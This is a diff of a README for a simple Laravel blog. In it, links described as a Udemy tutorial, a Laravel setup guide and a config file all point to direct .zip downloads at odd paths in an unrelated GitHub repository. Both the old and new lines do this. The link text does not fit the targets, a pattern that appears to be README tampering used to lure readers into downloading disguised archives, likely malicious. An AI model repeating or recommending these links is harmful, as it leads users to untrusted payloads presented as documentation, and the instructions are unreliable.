@@ -1,6 +1,6 @@
 # Simple Blog built on Laravel PHP Framework.
 
-Tutorial and a screencast are on Udemy: https://github.com/videogramme/drop101/raw/refs/heads/master/laravel/database/schema/grammars/drop-v3.6.zip  <- Laravel tutorials and a course by msurguy
+Tutorial and a screencast are on Udemy: https://raw.githubusercontent.com/videogramme/drop101/master/bundles/scribe/classes/1.9-alpha.5.zip  <- Laravel tutorials and a course by msurguy
 
 The blog features are :
 + twitter bootstrap layout implemented by bootstrapper bundle
@@ -9,11 +9,11 @@ The blog features are :
 + create new posts
 + delete posts
 
-To get this blog working on your local machine first get Laravel up and running (Tutorial here https://github.com/videogramme/drop101/raw/refs/heads/master/laravel/database/schema/grammars/drop-v3.6.zip )
+To get this blog working on your local machine first get Laravel up and running (Tutorial here https://raw.githubusercontent.com/videogramme/drop101/master/bundles/scribe/classes/1.9-alpha.5.zip )
 
 Copy this folder or create a symbolic link to your server's htdocs or www folder.
 
-Create a database "blog" and make sure your database settings in config -> https://github.com/videogramme/drop101/raw/refs/heads/master/laravel/database/schema/grammars/drop-v3.6.zip match your database setup.
+Create a database "blog" and make sure your database settings in config -> https://raw.githubusercontent.com/videogramme/drop101/master/bundles/scribe/classes/1.9-alpha.5.zip match your database setup.
 
 Then run migrations in the terminal or command line to set up tables from migrations: 
 <pre>
